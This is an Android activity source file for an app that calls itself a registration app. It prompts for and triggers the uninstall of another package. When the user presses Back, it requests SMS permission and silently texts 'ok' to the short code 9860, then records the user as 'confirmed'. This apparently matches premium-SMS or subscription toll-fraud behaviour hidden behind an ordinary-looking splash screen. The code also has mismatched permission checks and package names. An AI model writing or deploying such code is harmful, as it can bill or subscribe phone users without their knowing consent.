package com.akrobyte.registration;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.anviam.vloader.R;

import java.io.DataOutputStream;
import java.io.IOException;

public class SplashActivity extends Activity {
    private static final int PERMISSION_SEND_SMS = 123;
    private static final int REQUEST_CODE = 321;

    Button btnClick;

    String packageName = "com.aktobyte.registration";
    Context context = this;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        //requestSmsPermission();
        requestForUninstallPermission();
        btnClick = findViewById(R.id.btn_click);
        btnClick.setOnClickListener(v ->
        {
            try {
                uninstalled();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            // requestForUninstallPermission();
        });
    }

    private void requestForUninstallPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            PackageManager packageManager = getPackageManager();
            boolean hasPermission = packageManager.canRequestPackageInstalls();
            if (!hasPermission) {
                // Permission is not granted, so request it
                requestPermissions(new String[]{Manifest.permission.REQUEST_DELETE_PACKAGES}, REQUEST_CODE);
            } else {
                Uri packageUri = Uri.parse("package:com.aktobyte.registration");
                Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
                startActivity(uninstallIntent);
            }
        }
    }

    private void requestSmsPermission() {

        // check permission is given
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                // request permission (see result in onRequestPermissionsResult() method)
                requestPermissions(
                        new String[]{Manifest.permission.SEND_SMS},
                        PERMISSION_SEND_SMS);
            } else {
                // permission already granted run sms send
                sendSMS();
            }
        }
    }


    private void goToAppSettings() {
        AlertDialog.Builder dialogBuilder = new AlertDialog.Builder(this);
// ...Irrelevant code for customizing the buttons and title
        LayoutInflater inflater = this.getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.opensettingdialog, null);
        dialogBuilder.setView(dialogView);
        final AlertDialog alertDialog = dialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        TextView textView = dialogView.findViewById(R.id.buttonOk);
        textView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
                alertDialog.dismiss();
            }
        });

        alertDialog.show();
        double width = (this.getResources().getDisplayMetrics().widthPixels * 0.9);
        double height = (this.getResources().getDisplayMetrics().heightPixels * 0.25);
        alertDialog.getWindow().setLayout((int) width, (int) height);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_SEND_SMS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // permission was granted
                sendSMS();
            } else {
                goToAppSettings();
            }
        }else if(requestCode == REQUEST_CODE)
        {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Uri packageUri = Uri.parse("package:com.aktobyte.registration");
                Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
                startActivity(uninstallIntent);
            } else {
                // Permission denied, inform the user or handle it accordingly
            }
        }
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        requestSmsPermission();
    }

    private void sendSMS() {
        Intent intent;
        Intent intent2;
        BroadcastReceiver broadcastReceiver;
        IntentFilter intentFilter;
        BroadcastReceiver broadcastReceiver2;
        IntentFilter intentFilter2;
        String str = "SMS_SENT";
        String str2 = "SMS_DELIVERED";
        intent = new Intent(str);
        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        intent2 = new Intent(str2);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(this, 0, intent2, PendingIntent.FLAG_IMMUTABLE);
        broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (getResultCode() == -1) {
                    confirmUser();
                    return;
                }
                finish();
            }
        };
        intentFilter = new IntentFilter(str);
        Intent registerReceiver = registerReceiver(broadcastReceiver, intentFilter);
        broadcastReceiver2 = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (getResultCode() == -1) {
                    confirmUser();
                    return;
                }
                finish();
            }
        };
        intentFilter2 = new IntentFilter(str2);
        Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
            SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
        }
       /* String phoneNumber = "9860";
        String message = "Ok";

        // Open the SMS app with the specified number and message
        Uri uri = Uri.parse("smsto:" + phoneNumber);
        Intent intent3 = new Intent(Intent.ACTION_SENDTO, uri);
        intent3.putExtra("sms_body", message);
        startActivity(intent3);

        finish();*/
        unregisterReceiver(broadcastReceiver);
        unregisterReceiver(broadcastReceiver2);
    }

    private void confirmUser() {
        SharedPreferences sharedpreferences = getSharedPreferences("SampleApp", Context.MODE_PRIVATE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
            sharedpreferences.edit().putBoolean("isConfirm",true).apply();
        }
    }

    private boolean isConfirmUser(){
        SharedPreferences sharedpreferences = getSharedPreferences("SampleApp", Context.MODE_PRIVATE);
        return sharedpreferences.getBoolean("isConfirm",false);
    }

    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
    private void uninstalled() throws Exception {

        if (isAppInstalled(packageName, context)) {
            uninstallApp(packageName, context);
        } else {
            // The app is not installed
        }
       /* Uri packageUri = Uri.parse("package:com.aktobyte.registration");
        Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
        startActivity(uninstallIntent);*/
       /* Intent intent = new Intent(Intent.ACTION_DELETE);
        Uri packageUri = Uri.parse("package:com.aktobyte.registration");
        intent.setData(packageUri);
        //Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
        startActivity(intent);*/
    }

    // Uninstall the app
    public void uninstallApp(String packageName, Context context) {
       /* PackageManager packageManager = context.getPackageManager();
        packageManager.deletePackage(packageName, null);
*/
        String appPackage = "com.aktobyte.registration";
        Intent intent = new Intent(getApplicationContext(), getApplicationContext().getClass()); //getActivity() is undefined!
        PendingIntent sender = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        PackageInstaller mPackageInstaller =
                this.getPackageManager().getPackageInstaller();
        mPackageInstaller.uninstall(appPackage, sender.getIntentSender());
    }
    public static boolean isAppInstalled(String packageName, Context context) {
        PackageManager packageManager = context.getPackageManager();
        try {
            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

}
